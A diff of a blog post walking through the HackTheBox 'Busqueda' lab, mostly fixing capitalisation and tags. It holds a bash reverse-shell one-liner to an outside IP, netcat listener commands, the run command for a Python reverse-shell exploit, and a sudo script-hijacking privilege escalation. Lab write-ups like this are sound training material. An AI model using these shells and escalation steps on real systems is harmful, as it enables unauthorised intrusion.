@@ -4,7 +4,7 @@ title: HackTheBox Busqueda WalkThrough
 subtitle: How to get user and root flags on the HTB lab Busqueda
 thumbnail-img: /assets/img/htb_busqueda/busqueda_icon.png
 share-img: /assets/img/htb_busqueda/busqueda_icon.png
-tags: [hackthebox,htb,busqueda,red-team,windows,python,privilege-escalation,reverse-shell,security,walkthrough]
+tags: [hackthebox,htb,busqueda,red-team,linux,python,privilege-escalation,reverse-shell,security,walkthrough]
 author: Will
 ---
 
@@ -100,8 +100,6 @@ However, I want to work on my exploit writing, so I am going to go ahead and see
 My python is a bit rusty, so if you see bad coding practices, no you didn't.
 ### Weaponization
 
-from: https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py
-
 ``` python
 import sys
 import os
@@ -153,11 +151,11 @@ rev_shell(listening_IP, listening_PORT, target_URL)
 if __name__ == "__main__":
 main()
 ```
+Now that we understand what the exploit is doing, we are going to go ahead and run it
 
-now that we understand what the exploit is doing, we are going to go ahead and run it
 ### Delivery/Exploit/Installation
 
-before we start the exploit, we need a netcat instance to accept our reverse shell
+Before we start the exploit, we need a netcat instance to accept our reverse shell
 
 ``` bash
 nc -nlvp 8080 -s [INSERT_LOCAL_VPN_IP_HERE]
@@ -178,52 +176,52 @@ to break down this input:
 
 **heads up: you may need root permissions to open up a port, in which case just put a "sudo" at the beginning**
 
-now just run this command and we should be ready to go:
+Now just run this command and we should be ready to go:
 
 ``` bash
 python3 exploit.py [INSERT_LOCAL_VPN_IP_HERE] 8080 [INSERT_TARGET_URL_HERE]
 ```
-looks like we now have revshell as a user named svc:
+Looks like we now have revshell as a user named svc:
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-10-28_21-34-58.png)
 
 ### Command and Control
 
-it seems as though we already have a normal user, and if we navigate to the home directory we should see user.txt which contains our user flag.
+It seems as though we already have a normal user, and if we navigate to the home directory we should see user.txt which contains our user flag.
 
 I recommend a break here as we just did quite a bit.
 
-now let's see if we can get root.
+Now let's see if we can get root.
 
 ### Privilege escalation
 
-here we can upload linpeas or something of that nature. While that would work, I want to try and get low hanging fruit with a simple "sudo -l"
+Here we can upload linpeas or something of that nature. While that would work, I want to try and get low hanging fruit with a simple "sudo -l"
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-05_21-15-11.png)
 
-looks like there is a python script that the user can execute as root, but not read or write.
+Looks like there is a python script that the user can execute as root, but not read or write.
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-05_21-26-36.png)
 
-executing it, we get a couple options, but I chose to go with the "full-checkup" in order to get a larger picture as to what the script does.
+Executing it, we get a couple options, but I chose to go with the "full-checkup" in order to get a larger picture as to what the script does.
 
 It looks like there is an instance of gitea on the server, I am going to add "gitea.searcher.htb" to the etc/hosts and navigate to the site:
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-29-23.png)
 
-going through the site, this mainly looks like a git service that is used to maintain the site.
+Going through the site, this mainly looks like a git service that is used to maintain the site.
 
 I also see that the version is Gitea Version: 1.18.0+rc1, let's see if there are any associated CVEs:
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-30-48.png)
 
-while there are CVEs associated with Gitea, there aren't any associated with this current version. Looks like we are going to have to get creative:
+While there are CVEs associated with Gitea, there aren't any associated with this current version. Looks like we are going to have to get creative:
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-53-02.png)
 
 I do notice that full-checkup appears to be a bash file that get executed *with sudo privileges!* by the python script. While we can't edit this file, we could potentially make our own that will give us a reverse shell running as root.
 
-this is a really handy resource for making reverse shells in various languages:
+This is a really handy resource for making reverse shells in various languages:
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
@@ -234,9 +232,9 @@ I will be doing a classic bash reverse shell one-liner from the above resource t
 bash -c 'bash -i >& /dev/tcp/10.10.14.186/8080 0>&1'
 ```
 
-from here, we will create a new full-checkup.sh in the tmp directory and run the system-checkup.py and receive the shell on our machine:
+From here, we will create a new full-checkup.sh in the tmp directory and run the system-checkup.py and receive the shell on our machine:
 
-also make sure that you have a netcat session setup on the port of your choice:
+Also make sure that you have a netcat session setup on the port of your choice:
 
 ``` bash
 nc -nlvp 8080 -s 10.10.14.186
@@ -246,10 +244,10 @@ I did the following steps to create the file:
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-10_00-14-11.png)
 
-be sure to act quickly though, as the file will be deleted quickly
+Be sure to act quickly though, as the file will be deleted quickly
 
 ![](/assets/img/htb_busqueda/Screenshot_From_2024-11-10_00-15-14.png)
 
-we now have root, navigate to the root directory and grab the flag.
+We now have root, navigate to the root directory and grab the flag.
 
 Hope this helped, happy hacking!
